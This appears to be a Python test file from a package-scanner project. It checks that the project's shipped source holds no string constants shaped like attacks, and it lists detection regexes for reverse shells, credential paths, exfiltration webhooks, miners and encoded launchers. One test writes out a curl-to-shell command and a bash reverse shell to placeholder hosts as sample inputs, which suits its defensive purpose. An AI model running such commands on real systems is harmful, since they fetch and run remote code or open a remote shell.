"""Cordon's own package must not trip the scanners its users run (threat BP-15-31).

A scanner that reads Cordon's installed source finds what a malicious package would hold if the source spells attacks
out as plain text: a download piped to a shell, a reverse shell, a credential file's path, an exfiltration host, a
mining pool, an encoded launcher. Detection examples belong in the rule data (the YAML rules under
`src/cordon_scanner/rules/builtin/` and the data files under `src/cordon_scanner/*/data/`), which a code scanner does not
read as code; Python source names what it looks for in words or as a regular expression.

This reads every string constant of the shipped Python source (docstrings included) and counts the ones that read as
an attack on their own. A regular expression is not one: it is how a rule says what it matches. The counts that remain
are listed per file in `shipped_literals_debt.json` and only go down: a new file, or a count above its entry, fails; a
count below its entry asks for the entry to be lowered.
"""

from __future__ import annotations

import ast
import json
import re
from collections import Counter
from typing import ClassVar

from support import ROOT

SOURCE = ROOT / "src" / "cordon_scanner"
DEBT = ROOT / "tests" / "unit" / "repository" / "release" / "shipped_literals_debt.json"


class ShippedLiterals:
    """The attack shapes, and the count of string constants per file that carry one."""

    SHAPES: ClassVar[dict[str, re.Pattern[str]]] = {
        "pipe-to-shell": re.compile(r"\b(?:curl|wget)\b[^|\n]{1,200}\|\s*(?:ba|z)?sh\b"),
        "reverse-shell": re.compile(r"/dev/tcp/|\bnc\s+-e\b|bash\s+-i\s*>&"),
        # A key or cloud credential an attack reads; `.npmrc` and `.pypirc` are not here: Cordon reads them for
        # registry settings, which is their ordinary use.
        "credential-path": re.compile(r"~/\.ssh/id_(?:rsa|ed25519)|\.aws/credentials"),
        "exfil-host": re.compile(r"discord(?:app)?\.com/api/webhooks/|api\.telegram\.org/bot"),
        "miner": re.compile(r"stratum\+tcp://"),
        "encoded-launch": re.compile(
            r"powershell(?:\.exe)?\s+-e(?:nc)?\b|eval\(atob\(|exec\(base64\.b64decode"
        ),
    }
    #: A constant written as a regular expression: escapes, groups, classes or counted repeats.
    REGEX: ClassVar[re.Pattern[str]] = re.compile(r"\\[sdwbS]|\(\?[:i=!P]|\[\^|\{\d+,?\d*\}")

    @classmethod
    def shaped(cls, text: str) -> bool:
        return not cls.REGEX.search(text) and any(p.search(text) for p in cls.SHAPES.values())

    @classmethod
    def counts(cls) -> Counter[str]:
        out: Counter[str] = Counter()
        for path in sorted(SOURCE.rglob("*.py")):
            tree = ast.parse(path.read_text(encoding="utf-8"))
            for node in ast.walk(tree):
                if (
                    isinstance(node, ast.Constant)
                    and isinstance(node.value, str)
                    and cls.shaped(node.value)
                ):
                    out[path.relative_to(ROOT).as_posix()] += 1
        return out


class TestShippedLiterals:
    def test_no_new_attack_shaped_literal(self) -> None:
        allowed: dict[str, int] = json.loads(DEBT.read_text(encoding="utf-8"))
        now = ShippedLiterals.counts()
        over = {f: n for f, n in now.items() if n > allowed.get(f, 0)}
        assert not over, (
            "shipped source spells an attack out as text (move the example into rule data, or say it in words):\n"
            + "\n".join(
                f"  {f}: {n} (allowed {allowed.get(f, 0)})" for f, n in sorted(over.items())
            )
        )

    def test_the_list_only_goes_down(self) -> None:
        allowed: dict[str, int] = json.loads(DEBT.read_text(encoding="utf-8"))
        now = ShippedLiterals.counts()
        lower = {f: (n, now.get(f, 0)) for f, n in allowed.items() if now.get(f, 0) < n}
        assert not lower, "lower these entries in shipped_literals_debt.json:\n" + "\n".join(
            f"  {f}: listed {n}, now {m}" for f, (n, m) in sorted(lower.items())
        )

    def test_the_shapes_are_read(self) -> None:
        assert ShippedLiterals.shaped("curl -s https://example.invalid/x | sh")
        assert ShippedLiterals.shaped("bash -i >& /dev/tcp/203.0.113.1/4444 0>&1")
        assert not ShippedLiterals.shaped(r"\bcurl\b[^|]{0,80}\|\s*sh")
        assert not ShippedLiterals.shaped("a download piped to a shell")
